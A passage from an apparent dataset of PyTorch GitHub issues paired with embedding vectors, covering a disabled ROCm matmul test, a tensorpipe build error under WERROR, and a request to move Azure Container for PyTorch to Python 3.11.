  1.15673579e-01 -1.22674517e-01 -1.38631180e-01 -5.57350144e-02
  3.06618750e-01  2.43645325e-01 -4.17892575e-01  1.74119025e-01
 -1.12390086e-01 -5.27232997e-02  4.16368067e-01 -2.69950032e-01
  4.75489736e-01 -2.75320053e-01 -3.81994769e-02  3.29116464e-01
  1.38358220e-01 -2.29434550e-01 -1.19152717e-01 -8.34718123e-02]"
DISABLED test_cublas_baddbmm_large_input_2_100_100_100_cuda_float16 (__main__.TestMatmulCudaCUDA) module: rocm triaged skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474

cc @jeffdaily @sunway513 @pruthvistony @ROCmSupport @dllehr-amd @jataylo @hongxiayang",False,"[-0.02784182 -0.05435459 -0.12202053  0.0633819  -0.04661191 -0.25749826
  0.1922953   0.10308763 -0.4977549  -0.0505688   0.25154027 -0.2863017
  0.09856914  0.09131205 -0.48350543  0.04194636 -0.01797207 -0.02238057
  0.21345533  0.07286935 -0.13153487 -0.14264947 -0.36338     0.10217743
 -0.22925572  0.31276086 -0.34387732  0.00077772 -0.20817053  0.00424208
  0.09268098  0.05816126  0.30405226 -0.04433191  0.3418924  -0.09756869
 -0.29221153 -0.2672435  -0.187851   -0.06800178 -0.04156725 -0.14550596
 -0.00901514  0.10063656 -0.10915588 -0.01211955 -0.07507311  0.1347374
  0.00192198 -0.11621235  0.20423183 -0.13291863 -0.11459078 -0.3175865
 -0.07433847  0.1059712   0.23490623  0.30371457  0.20194495  0.463768
  0.1342909  -0.06377663 -0.19296658 -0.01973181  0.02353462  0.22988985
 -0.05578446 -0.2432332   0.30615875  0.16006923  0.02641138  0.12614739
 -0.1360134   0.23367171  0.20407733  0.4384371  -0.03797176 -0.01956008
 -0.1534299  -0.12803207 -0.29238385 -0.01052516 -0.05933316 -0.33647227
  0.34833083 -0.17634816  0.03702376 -0.01658239  0.0993959  -0.24732725
  0.21768075  0.21404813  0.03982635  0.01618941 -0.02052924 -0.10177791
  0.03305318 -0.0814632  -0.41166663  0.05990556  0.06653879 -0.15207735
 -0.26433295  0.23257469 -0.47623658 -0.18076691  0.17848997 -0.23407528
 -0.10537337  0.32738996  0.1617766  -0.01004666 -0.0865962   0.40897462
  0.06102237  0.13696307 -0.22553755 -0.30975837 -0.21158646  0.33581644
 -0.20844382 -0.43051898  0.03138781  0.03248399  0.16196111 -0.13322215
  0.01523271  0.16746365 -0.025852    0.01055712 -0.00373893 -0.05976501
  0.10935207  0.02512299 -0.38725692  0.10983716  0.03515201 -0.03668281
  0.09337361  0.24010678 -0.24731843  0.28745085  0.01857845 -0.11852799
  0.26655096  0.03123411 -0.34783953  0.26859263  0.1948038   0.16659606
  0.09817784 -0.15132803  0.08849368  0.7716566  -0.03550317 -0.05584688
  0.47243804  0.16417019 -0.24147603 -0.26361835 -0.04338702 -0.00856519
  0.02449698 -0.04380553  0.2305291  -0.05242165 -0.36998594  0.09809287
 -0.09550053  0.27892554  0.11132918  0.18005972  0.23621735  0.01981065
  0.15489003 -0.3229149   0.14164498 -0.1518882  -0.14469974  0.03903359
  0.02569763  0.1601687   0.65911007 -0.08409429 -0.13501449  0.18831697
  0.04759686  0.0832203   0.02498529 -0.0761663  -0.39246368  0.11090732
  0.07308075  0.03276997 -0.28559253 -0.16663605 -0.06666452 -0.25238064
  0.07448903  0.01015066 -0.0337622   0.10411303 -0.12570468 -0.34014168
 -0.01535681  0.12857193 -0.18126345 -0.47740802  0.23686771  0.13986616
 -0.19180147 -0.4047355  -0.23571599 -0.08065215 -0.06054945  0.08802438
 -0.12380841  0.1175649  -0.283137    0.10934635  0.01676995 -0.1908589
 -0.086854   -0.29272678 -0.3784041  -0.07956197  0.14156705  0.01711166
 -0.03740224  0.10257293  0.05780296 -0.17400005  0.12182517 -0.02709282
  0.10044429 -0.01680293 -0.2518482  -0.20236292 -0.13964249  0.15742275
 -0.08268899 -0.20847258 -0.2902128   0.02915264  0.0627      0.41044256
 -0.27090117  0.12197536 -0.29871464  0.11984363  0.08964235 -0.09912038
  0.05631768  0.15306559 -0.20322645  0.21033257  0.02637246  0.0081671
  0.23590714 -0.10691127  0.33322665  0.37861508 -0.24658215  0.59861284
  0.42769888  0.32247365 -0.2856121  -0.03373551 -0.18728413 -0.00515554
  0.00107194 -0.43141267  0.24445173 -0.03520482  0.24630795 -0.2952565
  0.42996937  0.13290225 -0.10817772 -0.02418293  0.23455143  0.1589862
  0.04746777  0.14090416  0.19731784 -0.18939891 -0.26950657 -0.3935815
 -0.23337482 -0.15152833  0.15549773  0.2770729   0.18754119  0.13145486
 -0.24502586  0.07937913  0.28327873  0.19924688  0.27022478 -0.03298725
 -0.37759274  0.01842723  0.10136669 -0.4228768  -0.14735916 -0.03983541
  0.02292195  0.26007462  0.4268818  -0.25844285 -0.0295418   0.06933925
 -0.00864394  0.36316878  0.09002355  0.13854799 -0.06849581  0.1039072
  0.0489079   0.04661098  0.20689368 -0.28811044 -0.26944715  0.11613622
  0.10676417  0.04234834 -0.36550495 -0.13587624 -0.04403707 -0.06178311
  0.12189347 -0.19761848 -0.13935728  0.04743069 -0.03815265 -0.12366295
  0.04009173  0.471031    0.2710525  -0.3896734  -0.2598669   0.00845316
 -0.07110967 -0.1102852  -0.09306209 -0.04736064  0.4367072   0.46572456
 -0.18181056  0.21307558 -0.01877597  0.1545037   0.04670995  0.0509588
  0.12715603  0.32786632  0.19560307  0.30026913  0.1793051   0.05589208
 -0.1406049   0.08007382 -0.5737995   0.03080473  0.14477319 -0.11816169
 -0.13333756 -0.05500935  0.30537182  0.23832586 -0.41083428  0.17879209
 -0.100655   -0.03243797  0.4009343  -0.24644887  0.46607223 -0.22942859
 -0.02502887  0.32962447  0.14369418 -0.213136   -0.0890649  -0.07929303]"
Error when building PyTorch from source with WERROR=1 and USE_DISTRIBUTED=1 module: build triaged module: tensorpipe,"# Summary
When building with the following two settings on Main I am getting the following error:
``` Shell
/pytorch/torch/csrc/distributed/rpc/tensorpipe_agent.cpp
In file included from /home/drisspg/meta/pytorch/torch/csrc/distributed/rpc/tensorpipe_agent.cpp:10:
In file included from /home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/tensorpipe.h:15:
In file included from /home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/core/context.h:18:
In file included from /home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/channel/context.h:16:
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:27:13: error: definition of implicit copy constructor for 'AbstractBufferWrapper' is deprecated because it has a user-declared destructor [-Werror,-Wdeprecated-copy-with-dtor]
    virtual ~AbstractBufferWrapper() = default;
            ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:31:9: note: in implicit copy constructor for 'tensorpipe::Buffer::AbstractBufferWrapper' first required here
  class BufferWrapper : public AbstractBufferWrapper {
        ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:46:17: note: in implicit copy constructor for 'tensorpipe::Buffer::BufferWrapper<tensorpipe::CpuBuffer>' first required here
      new (ptr) BufferWrapper(*this);
                ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:39:14: note: in instantiation of member function 'tensorpipe::Buffer::BufferWrapper<tensorpipe::CpuBuffer>::copyConstructInto' requested here
    explicit BufferWrapper(TBuffer buffer) : buffer(std::move(buffer)) {}
             ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:62:17: note: in instantiation of member function 'tensorpipe::Buffer::BufferWrapper<tensorpipe::CpuBuffer>::BufferWrapper' requested here
    new (&raw_) BufferWrapper<TBuffer>(std::move(b));
                ^
/home/drisspg/meta/pytorch/third_party/tensorpipe/tensorpipe/common/buffer.h:65:14: note: in instantiation of function template specialization 'tensorpipe::Buffer::Buffer<tensorpipe::CpuBuffer>' requested here
  Buffer() : Buffer(CpuBuffer{}) {}
             ^
1 error generated.
[2271/3099] Building CXX object caffe2/CMakeFiles/torch_cpu.dir/__/torch/csrc/api/src/nn/modules/conv.cpp.o
```

By updating tensorpipe/common/buffer.h to have 

``` C++
  class AbstractBufferWrapper {
   public:
    AbstractBufferWrapper() = default;
    AbstractBufferWrapper(const AbstractBufferWrapper&) = default;
    AbstractBufferWrapper& operator=(const AbstractBufferWrapper&) = default;

    virtual Device device() const = 0;
    virtual void copyConstructInto(void* ptr) const = 0;
    virtual void moveConstructInto(void* ptr) = 0;
    virtual ~AbstractBufferWrapper() = default;
  };
  ```
  I was able to avoid the werror but I am not sure if these default constructors are actually valid


cc @malfet @seemethere @osalpekar @jiayisuse @lw @beauby @pritamdamania87 @mrshenli @jjlilley @gqchen @rohan-varma",False,"[-0.29407048 -0.42931116 -0.24421208  0.06807873  0.06126186 -0.27131534
 -0.2430706  -0.07899976 -0.42997473 -0.01916767  0.00549154 -0.07193559
 -0.04811631  0.19265124  0.13313337  0.17676625 -0.24796069 -0.2438958
  0.04535668 -0.04624587  0.09145763  0.22773686  0.00926256  0.13700178
 -0.20861253  0.06869785  0.04057031 -0.3638842   0.0425484   0.07697839
  0.46008784 -0.27386492 -0.2283769  -0.07334101 -0.01178526  0.31620634
 -0.29987967  0.03295786 -0.06461371 -0.0424337   0.271684    0.10758463
  0.02131552  0.05520464 -0.22469996 -0.12833941 -0.10476741  0.12275975
 -0.3053361  -0.06186047 -0.31296867  0.01820344 -0.344705   -0.18889952
  0.04228643 -0.24144539 -0.10167853  0.47830278  0.05014898 -0.07348738
  0.18453512 -0.09611654  0.05854798 -0.0410707  -0.14833806  0.0427459
  0.23321243  0.00624504  0.44343174 -0.22035527 -0.19554083  0.07705691
 -0.2051705  -0.34838364  0.00763532  0.22855073 -0.3056251   0.20657706
  0.07675228 -0.20036693  0.06738564  0.17578323  0.15831977  0.04707148
  0.09019075 -0.05092164  0.03724016  0.12862605  0.28996474  0.0222917
  0.5283979   0.01434423  0.00843862  0.16512245 -0.27761382  0.3219853
 -0.06760052  0.23855458  0.07172237 -0.29937387 -0.10459383 -0.40139115
 -0.2890408   0.18184939  0.01912975 -0.00202426  0.09462683  0.328115
  0.11665376 -0.12858589  0.10315093  0.12275265 -0.08694811 -0.1342915
  0.1914315   0.27689153 -0.30145475  0.14266965 -0.08341903  0.32806885
 -0.07052521 -0.22870798  0.0842879   0.19782352  0.06941809  0.0963116
 -0.05104698 -0.06484034  0.10965853  0.2668955   0.15625256  0.1307284
 -0.20886402  0.10972404  0.31087345  0.13368642 -0.32895905 -0.10698505
  0.05763352 -0.12715681 -0.05662946  0.22485545 -0.36298746 -0.26174945
  0.15701821 -0.01255808  0.0220806   0.04294002 -0.0239249   0.2968551
 -0.22462541  0.00501219 -0.28626674  0.5464225   0.14723048  0.25770006
  0.16676715 -0.02378611  0.07871279 -0.42381936 -0.06475629  0.38314682
 -0.0760452   0.12742409 -0.22038007 -0.01942378 -0.41786963 -0.25300387
 -0.15262341 -0.10772485 -0.09894648 -0.09841409  0.11320011 -0.28242373
  0.00702856  0.07196529  0.08523682 -0.39831144  0.00340784  0.36565697
  0.27520496  0.44029474  0.06680779  0.03465961 -0.0535244   0.05131229
  0.41592327 -0.01050271 -0.13175659  0.16934744 -0.30170685 -0.01111213
  0.11563305 -0.02246431 -0.10735838 -0.07364605  0.24191755  0.25300118
  0.16309161  0.13804053  0.03761557  0.20454678  0.15368848  0.1425885
 -0.12065981 -0.13343197 -0.27580303 -0.19032261 -0.7408016   0.19176914
 -0.2708822  -0.29630274 -0.0063079  -0.15065049 -0.2672204   0.2661826
  0.03668315  0.18539086 -0.01502074  0.1056022   0.03337585 -0.07058405
 -0.034864   -0.14918928  0.2781505  -0.00849434 -0.12329653 -0.17671749
 -0.05943     0.20037481 -0.20504922 -0.33040988  0.42450172  0.09361245
 -0.16366363  0.00855904  0.3140733  -0.15473539  0.02627488  0.3679769
 -0.21914679 -0.24361174 -0.19656269 -0.24649575 -0.30271745  0.19331446
 -0.09362511  0.21134934 -0.23947291  0.24161598  0.11488332 -0.12088841
  0.21273969  0.3808933   0.4973872   0.11990577 -0.18520717  0.032527
 -0.15279455 -0.05006877  0.0043581   0.24982247 -0.06702726  0.48959982
  0.10093032 -0.0137863  -0.38915843  0.26314574 -0.15040761 -0.3013117
  0.3481125  -0.39149338  0.32561028 -0.02773437  0.05648409  0.03930311
  0.26651916 -0.05826771 -0.05828289  0.07612     0.23810838  0.46211913
 -0.11276613 -0.10226516  0.16078572 -0.13423488 -0.2228589  -0.46833536
 -0.25521967  0.03606259 -0.06190389 -0.02513102  0.18908358 -0.02640361
 -0.10219752  0.18101099  0.10825656  0.02912174  0.11177211  0.20927563
 -0.12114654  0.1204595   0.01606385  0.129433   -0.04916532  0.01855158
  0.09645973 -0.02272731  0.55363226 -0.50975114  0.31277406  0.03903641
  0.10123772  0.17561513 -0.1198888   0.09896366 -0.06183706  0.3541842
  0.15731709  0.05887007  0.10553947 -0.10145731 -0.24032173  0.01052281
 -0.02091978  0.17458135 -0.02518217 -0.28304893 -0.18632233  0.17612623
 -0.00408029 -0.17984268  0.1360707   0.22281775 -0.07651298 -0.01065149
 -0.11327525  0.12429572 -0.01611455 -0.4675917  -0.05712781 -0.2957133
  0.24652871 -0.23138136 -0.17436893 -0.2715451   0.28728658  0.08031455
 -0.22521234 -0.01557719 -0.06564546 -0.03716918 -0.24278638  0.08892236
  0.19960459  0.18517737  0.15007675  0.07509491  0.20646581  0.5884899
 -0.41565597  0.1567049  -0.11418396 -0.2724679  -0.07961258 -0.26360744
 -0.1692344  -0.19713242 -0.00619905  0.43250617 -0.2457826   0.34139574
 -0.29312575  0.12277491  0.43100634  0.07455848 -0.12640603  0.17402072
  0.00214011 -0.15224174 -0.12046492  0.18824528 -0.0409993  -0.39334387]"
DISABLED test_cublas_baddbmm_large_input_2_100_100_100_cuda_float16 (__main__.TestMatmulCudaCUDA) skipped,"Platforms: rocm

This test was disabled because it is failing on MI210 runners as part of https://github.com/pytorch/pytorch/pull/105980:
https://github.com/pytorch/pytorch/actions/runs/5744430164/job/15572649474",False,"[ 0.0402748  -0.06093077 -0.10533223  0.14609586 -0.0410816  -0.28918228
  0.17515787  0.1207858  -0.48824757 -0.15857689  0.25908995 -0.29245248
  0.11085622  0.03091532 -0.4559757   0.02642306 -0.02206662 -0.00646977
  0.19003034  0.06447548 -0.17509623 -0.13266727 -0.26082486  0.05838267
 -0.25489938  0.18861371 -0.35787526  0.06454536 -0.30401248  0.07604922
  0.08129096  0.03913487  0.25774616 -0.11287399  0.3215877  -0.11128528
 -0.26464152 -0.28970388 -0.23156014 -0.03444896 -0.07239863 -0.10665153
 -0.05539801  0.15045497 -0.08032     0.06865706 -0.12011635  0.11502872
 -0.0070234  -0.15208161  0.22273016 -0.10837127 -0.1352694  -0.24835923
 -0.00345455  0.09269369  0.1689972   0.24671236  0.22951287  0.41690975
  0.13249551 -0.06173228 -0.16102922 -0.08993059 -0.04904525  0.20811585
 -0.06286111 -0.22289123  0.34054706  0.12824526  0.04584179  0.2099327
 -0.17043374  0.28818715  0.18582505  0.45457172 -0.12928107  0.01915825
 -0.23990501 -0.15737513 -0.29433754 -0.15556788 -0.0297703  -0.2945444
  0.4348865  -0.08231339  0.00185754 -0.00610127 -0.0178738  -0.22896303
  0.16124552  0.15392765 -0.00269179  0.03182752 -0.02747668 -0.06692627
  0.01279779 -0.11150704 -0.41085273  0.07466331  0.07278609 -0.20373683
 -0.37162942  0.28100356 -0.36167145 -0.17853844  0.14985144 -0.1813824
 -0.12347749  0.22317332  0.22146983 -0.10378534 -0.05505764  0.56507725
  0.10153627  0.0963569  -0.20200118 -0.24699135 -0.12862788  0.3409201
 -0.15811493 -0.33596814  0.00329592  0.05380429  0.22146447 -0.13088423
 -0.01844796  0.2709976  -0.02857239 -0.05742668  0.00190989 -0.13214698
  0.1528994   0.09270005 -0.42503667 -0.00535626  0.05941254 -0.08468863
  0.0420519   0.15970068 -0.18690771  0.2534409   0.12999403 -0.08851299
  0.17203526  0.04963057 -0.34061575  0.3573846   0.2159043   0.17817844
  0.07307572 -0.12683444  0.03860788  0.7432587  -0.14066343 -0.06866889
  0.45185167  0.15401837 -0.31707418 -0.32998884 -0.01159282 -0.01034795
  0.00689278 -0.03310492  0.25917354 -0.01758927 -0.39059055  0.04242437
 -0.05461061  0.17769459  0.05193964  0.17663805  0.22520494  0.01115853
  0.07551733 -0.30883056  0.14555758 -0.1578646  -0.16162485  0.06726003
  0.09954922  0.07125118  0.5804169  -0.05900876 -0.06541906  0.24069285
 -0.01546696  0.11722023  0.01162568 -0.05768245 -0.33075517  0.05188584
  0.06883741  0.10691885 -0.30986798 -0.14885673 -0.12053238 -0.19074811
  0.1310603   0.03537949 -0.06632218  0.10300993 -0.06854764 -0.34547484
 -0.06558421  0.05403238 -0.14142092 -0.5264061   0.3040209   0.12397003
 -0.28800723 -0.35542554 -0.27498204 -0.14076433 -0.15700714  0.02354748
 -0.07374519  0.09703117 -0.18959671  0.14264512 -0.11025496 -0.20394246
 -0.136272   -0.31265122 -0.35776138  0.03015659  0.12709168  0.05227023
  0.0884608   0.14828563  0.09440673 -0.18968308  0.09884566  0.0101954
  0.14455189  0.05910771 -0.30628163 -0.20264736 -0.16117576  0.23476166
 -0.10986254 -0.14993186 -0.31064966 -0.02026212 -0.07270722  0.38399684
 -0.2712305   0.15168485 -0.2805341   0.10928409  0.16464047 -0.12227944
 -0.07367596  0.08094014 -0.12287514  0.10114287  0.06702766 -0.01782217
  0.30124193 -0.10832903  0.3240257   0.32745284 -0.20678627  0.590982
  0.3637755   0.32540807 -0.19150612  0.07958628 -0.19108807  0.06448346
  0.12715803 -0.40273935  0.2615606  -0.05071784  0.24579258 -0.26545864
  0.43997675  0.21401514 -0.12893634 -0.01424368  0.244313    0.19186288
  0.11711474  0.17768323  0.14067498 -0.15021546 -0.29155165 -0.33721042
 -0.26799762 -0.22702011  0.09003201  0.33916783  0.19996822  0.1270116
 -0.18464111  0.13455242  0.28373486  0.14338407  0.29066712  0.03769802
 -0.39179444  0.13925959  0.05240181 -0.4122556  -0.15025045 -0.00350574
 -0.00913988  0.24918498  0.39976716 -0.22670797 -0.01871641  0.09603883
 -0.01674132  0.35668108  0.12773795  0.11316823 -0.14623886  0.14200006
  0.08954148  0.05978467  0.27690402 -0.25644392 -0.35991448  0.09296764
  0.16997951  0.0436507  -0.34012455 -0.10692129 -0.07052902 -0.0203706
  0.1750081  -0.15611465 -0.10342342 -0.02091348 -0.01106626 -0.09453056
  0.06682506  0.4793153   0.27206331 -0.28962317 -0.26635593 -0.06845747
 -0.06868969 -0.05746225 -0.02305941 -0.18872125  0.40045896  0.49308348
 -0.18601032  0.11865297  0.10011199  0.16466084 -0.02308671  0.14181362
  0.15932645  0.3458656   0.11119168  0.37834322  0.26794106  0.10031281
 -0.26118124  0.0548406  -0.5637853   0.06406743  0.08874661 -0.11136033
 -0.21020329 -0.08606748  0.2729317   0.21633033 -0.43901348  0.13786821
 -0.17784029 -0.05284964  0.4549396  -0.24691547  0.3470227  -0.2205219
 -0.10856324  0.24680635  0.17038366 -0.14175013 -0.04188184 -0.02183716]"
[ONNX] Update ACPT to support Python 3.11 module: onnx triaged onnx-triaged release notes: onnx,"### ðŸš€ The feature, motivation and pitch

[Azure Container for PyTorch (aka ACPT)](https://learn.microsoft.com/en-us/azure/machine-learning/resource-azure-container-for-pytorch?view=azureml-api-2) is currently distributed using python 3.8/3.9. Although this is ok for Pytorch 1.x series, the latest PyTorch 2.x leverages Python 3.11 features for better graph lowering from `torch.nn.Module` to `torch.fx.GraphModule`. It also has model transformation/optimization that are better maintained for newer python versions. Below is a list of several places in which we can see Dynamo forking behavior between old (mostly 3.8 and 3.9) and newer python versions (3.10 and 3.11)

```bash
(ptca) root@88c3e49b4bcf:/opt/pytorch# grep sys\.version_info torch/_dynamo -Rn
torch/_dynamo/bytecode_transformation.py:114:    inst = ""JUMP_FORWARD"" if sys.version_info >= (3, 11) else ""JUMP_ABSOLUTE""
torch/_dynamo/bytecode_transformation.py:144:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:162:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:168:    if sys.version_info < (3, 8) and n >= 4:
torch/_dynamo/bytecode_transformation.py:170:    if sys.version_info < (3, 10) and n >= 5:
torch/_dynamo/bytecode_transformation.py:196:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:208:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:222:    assert sys.version_info < (3, 10)
torch/_dynamo/bytecode_transformation.py:244:    assert sys.version_info >= (3, 10) and sys.version_info < (3, 11)
torch/_dynamo/bytecode_transformation.py:294:    assert sys.version_info >= (3, 11)
torch/_dynamo/bytecode_transformation.py:441:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:463:        if sys.version_info < (3, 10):
torch/_dynamo/bytecode_transformation.py:474:        if sys.version_info >= (3, 10):
torch/_dynamo/bytecode_transformation.py:503:    if sys.version_info < (3, 11):
torch/_dynamo/bytecode_transformation.py:538:                if sys.version_info < (3, 10):
torch/_dynamo/bytecode_transformation.py:540:                elif sys.version_info < (3, 11):
torch/_dynamo/bytecode_transformation.py:550:                    if sys.version_info < (3, 11):
torch/_dynamo/bytecode_transformation.py:558:                    if sys.version_info >= (3, 11) and ""BACKWARD"" in inst.opname:
torch/_dynamo/bytecode_transformation.py:560:                if sys.version_info >= (3, 10):
torch/_dynamo/bytecode_transformation.py:740:            assert sys.version_info >= (3, 11)
torch/_dynamo/bytecode_transformation.py:864:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:922:    if sys.version_info < (3, 11):
torch/_dynamo/bytecode_transformation.py:955:            if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1001:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1004:    if sys.version_info >= (3, 10):
torch/_dynamo/bytecode_transformation.py:1008:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1040:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1055:    if sys.version_info < (3, 10):
torch/_dynamo/bytecode_transformation.py:1065:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1081:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_transformation.py:1087:        if sys.version_info < (3, 11):
torch/_dynamo/resume_execution.py:64:            ""NOP"" if sys.version_info < (3, 11) else ""PUSH_EXC_INFO""
torch/_dynamo/resume_execution.py:78:        if sys.version_info < (3, 11):
torch/_dynamo/resume_execution.py:105:        if sys.version_info < (3, 9):
torch/_dynamo/resume_execution.py:113:        elif sys.version_info < (3, 11):
torch/_dynamo/resume_execution.py:161:        if sys.version_info < (3, 9):
torch/_dynamo/resume_execution.py:178:        elif sys.version_info < (3, 11):
torch/_dynamo/resume_execution.py:355:        is_py311_plus = sys.version_info >= (3, 11)
torch/_dynamo/resume_execution.py:440:                if sys.version_info >= (3, 11):
torch/_dynamo/resume_execution.py:507:        if sys.version_info >= (3, 11):
torch/_dynamo/output_graph.py:774:        if sys.version_info >= (3, 11):
torch/_dynamo/output_graph.py:1288:        if sys.version_info >= (3, 11) and kind in (
torch/_dynamo/symbolic_convert.py:214:    if sys.version_info < (3, 9):
torch/_dynamo/symbolic_convert.py:467:            if sys.version_info >= (3, 11) and inst.opname == ""CALL"":
torch/_dynamo/symbolic_convert.py:489:            if sys.version_info >= (3, 11) and inst.opname == ""CALL"":
torch/_dynamo/symbolic_convert.py:668:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:846:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1156:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1200:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1437:        if sys.version_info < (3, 11):
torch/_dynamo/symbolic_convert.py:1440:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1664:            if sys.version_info < (3, 11):
torch/_dynamo/symbolic_convert.py:1668:            if sys.version_info < (3, 11):
torch/_dynamo/symbolic_convert.py:1719:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1802:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:1970:        if sys.version_info >= (3, 10):
torch/_dynamo/symbolic_convert.py:2141:        if sys.version_info >= (3, 11):
torch/_dynamo/symbolic_convert.py:2320:        if sys.version_info >= (3, 11):
torch/_dynamo/variables/misc.py:1053:        if sys.version_info < (3, 11):
torch/_dynamo/codegen.py:251:        if push_null and sys.version_info >= (3, 11):
torch/_dynamo/codegen.py:279:        assert sys.version_info >= (3, 11)
torch/_dynamo/codegen.py:292:        if sys.version_info >= (3, 11) and push_null:
torch/_dynamo/codegen.py:300:        if sys.version_info < (3, 11):
torch/_dynamo/codegen.py:347:        if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_analysis.py:13:if sys.version_info >= (3, 9):
torch/_dynamo/bytecode_analysis.py:15:if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_analysis.py:64:    if sys.version_info >= (3, 11):
torch/_dynamo/bytecode_analysis.py:222:                sys.version_info < (3, 9) and inst.opcode == dis.opmap[""CALL_FINALLY""]
torch/_dynamo/backends/registry.py:102:    if sys.version_info < (3, 10):
torch/_dynamo/types.py:17:if sys.version_info >= (3, 11):
torch/_dynamo/testing.py:344:    if sys.version_info >= (3, 11):
torch/_dynamo/eval_frame.py:506:    if sys.version_info < (3, 11):
torch/_dynamo/eval_frame.py:595:    if sys.version_info >= (3, 12):
torch/_dynamo/test_case.py:24:        or sys.version_info >= (3, 12)
torch/_dynamo/guards.py:123:if sys.version_info[:2] <= (3, 8):
torch/_dynamo/utils.py:1925:    assert sys.version_info >= (3, 11)
```

By using dynamo with python 3.8/3.9, we can obtain suboptimal graphs that don't leverage the latest optimizations coming from latest dynamo. Another side effect is that important third party dependencies may not be optimal for old python too, such as `transformers` and others

### Alternatives

_No response_

### Additional context

_No response_",False,"[-2.00845152e-01 -3.32816005e-01 -3.13539058e-01 -1.15450114e-01
  1.28978997e-01 -1.11859217e-02 -1.94254220e-02 -1.84893370e-01
 -3.75957727e-01  8.02476425e-03 -7.41513353e-03  7.03033581e-02
 -3.33266407e-02 -5.72743416e-02 -1.93542661e-03  2.03724384e-01
 -1.65852055e-01 -1.78167284e-01  1.02053910e-01  4.21989709e-03
 -2.62735605e-01  1.67819887e-01  1.02439135e-01  5.84111772e-02
  1.52029797e-01  2.87654530e-03 -1.11649767e-01 -1.53302386e-01
  6.94621652e-02  2.08885729e-01  4.61141407e-01 -3.11250985e-02
 -2.05806166e-01  6.11234568e-02 -1.78793937e-01 -1.93716176e-02
 -2.68568754e-01 -1.01464383e-01 -1.62293613e-01  6.56397790e-02
  8.15868974e-02  1.81721970e-01  3.74337099e-03  1.53306365e-01
  2.09356658e-04  7.27375448e-02 -2.63756365e-01 -6.22177310e-03
 -3.99793506e-01 -8.94530118e-02  2.27922723e-02 -3.48124504e-01
 -2.38279551e-02  7.22921714e-02  8.64679292e-02  2.13754937e-01
 -2.33660296e-01  1.73125789e-01 -1.50151208e-01  3.54090296e-02
 -4.40653525e-02 -1.69745505e-01  6.43705949e-02  1.90411687e-01
 -2.11567789e-01  3.44918013e-01  9.16339308e-02 -2.34396666e-01
  2.49158680e-01 -2.28931636e-01 -1.79096699e-01 -6.36585355e-02
 -4.25406218e-01 -1.17797524e-01 -5.59165701e-02  1.14840746e-01
 -1.77660286e-01  2.61460125e-01  9.56775993e-02  5.39519936e-02
 -5.89256510e-02  2.04237252e-01  2.27010489e-01  1.82597384e-01
  1.00331180e-01 -1.10898413e-01  3.20439115e-02  9.23863947e-02
 -2.93138996e-02  9.53931175e-03  4.65473920e-01  3.15824270e-01
 -7.81100839e-02  2.86255255e-02  2.26335451e-01  4.38441634e-01
 -1.51983351e-01 -2.71611214e-01 -1.17907807e-01 -2.60897763e-02
 -3.84642005e-01 -3.49237859e-01 -3.73302579e-01 -5.55931628e-02
 -1.48494497e-01 -2.10923702e-01  3.73065412e-01  3.24247107e-02
  1.62274912e-01 -1.30739853e-01  1.62070505e-02  6.32304847e-02
 -6.95134252e-02 -5.57804815e-02 -2.32964866e-02  5.83435893e-02
 -2.16243312e-01  1.36741877e-01  2.25419074e-01  1.82392597e-01
  1.72780082e-02 -2.15738207e-01  3.07639837e-01  1.37426615e-01
  6.88826591e-02 -4.60353456e-02 -7.67735019e-02 -1.14871517e-01
 -3.35628912e-02  1.65213719e-02  1.26751572e-01 -9.74559337e-02
  2.30779685e-02 -6.49741217e-02  2.18810022e-01 -1.02678634e-01
 -1.01733375e-02 -3.68699491e-01 -1.81091547e-01 -1.24823816e-01
 -2.60126889e-01  3.29114012e-02 -6.83074147e-02 -2.41947532e-01
 -2.64024019e-01  4.09479141e-01  5.12683615e-02  3.20835531e-01
  1.89559460e-01 -1.84332989e-02 -7.05216527e-02  1.32946700e-01
 -2.52034307e-01  4.35649961e-01  2.64988899e-01  2.66751349e-01
  1.39421970e-01  3.66491377e-02  2.54202634e-01 -9.23437625e-02
 -2.77932465e-01  1.92631617e-01 -1.03631355e-01 -1.10941008e-01
 -1.33861035e-01  8.53101462e-02 -1.68996289e-01  5.92368320e-02
 -1.17651753e-01  2.01212354e-02 -1.81715250e-01 -1.64237320e-01
  4.68108766e-02 -1.43269211e-01  2.96177626e-01 -1.73866838e-01
  2.75794297e-01 -4.10688043e-01  2.13184848e-01  1.73222721e-01
